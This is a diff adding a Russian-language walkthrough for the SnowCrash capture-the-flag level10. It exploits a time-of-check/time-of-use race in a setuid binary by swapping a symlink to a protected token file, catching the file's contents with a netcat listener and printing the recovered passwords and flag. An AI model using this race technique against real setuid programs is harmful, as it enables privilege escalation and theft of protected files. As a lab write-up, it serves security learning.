@@ -1,0 +1,55 @@
+-Взглянем на файлы, у нас есть экзекьютбл и токен
+
+level10@SnowCrash:~$ ls -l
+total 16
+-rwsr-sr-x+ 1 flag10 level10 10817 Mar  5  2016 level10
+-rw-------  1 flag10 flag10     26 Mar  5  2016 token
+
+
+-Взглянем через ltrace, подсунув токен
+
+level10@SnowCrash:~$ ltrace ./level10  token
+__libc_start_main(0x80486d4, 2, 0xbffff6e4, 0x8048970, 0x80489e0 <unfinished ...>
+printf("%s file host\n\tsends file to ho"..., "./level10"./level10 file host
+	sends file to host if you have access to it
+) = 65
+exit(1 <unfinished ...>
++++ exited (status 1) +++
+./level10 file host
+	sends file to host if you have access to it
+
+
+-Судя по описанию экзекьютбл открывает сетевое соединение для отправки файла на хост. Создадим файл и попробуем его отправить на локалхост. Теперь нам известен порт: 6969
+
+level10@SnowCrash:~$ echo file > /tmp/file
+level10@SnowCrash:~$ ./level10 /tmp/file 127.0.0.1
+Connecting to 127.0.0.1:6969 .. Unable to connect to host 127.0.0.1
+
+
+-Напишем скрипт, который создает форк процесса и создадим такое состояние, при котором между вызовами links и open, мы попытаемся изменить файл отправки. А то есть, скрипт, который создает файл в , а затем одновременно запускает исполняемый файл с ссылкой на token
+
+level10@SnowCrash:~$ cd /tmp
+level10@SnowCrash:/tmp$ vim links.c
+level10@SnowCrash:/tmp$ gcc links.c -o links
+
+
+-Открываем второй терминал, начинаем слушать порт 6969, запустив скрипт в бесконечном цикле
+
+level10@SnowCrash:/tmp$ while true; do ./access; done
+level10@SnowCrash:~$ nc -lk 6969
+.*( )*.
+.*( )*.
+.*( )*.
+woupa2yuojeeaaed06riuj63c
+
+
+-Готово
+
+level10@SnowCrash:~$ su flag10
+Password: woupa2yuojeeaaed06riuj63c
+Don't forget to launch getflag !
+flag10@SnowCrash:~$ getflag
+Check flag.Here is your token : feulo4b72j7edeahuete3no7c
+flag10@SnowCrash:~$ su level11
+Password: feulo4b72j7edeahuete3no7c
+
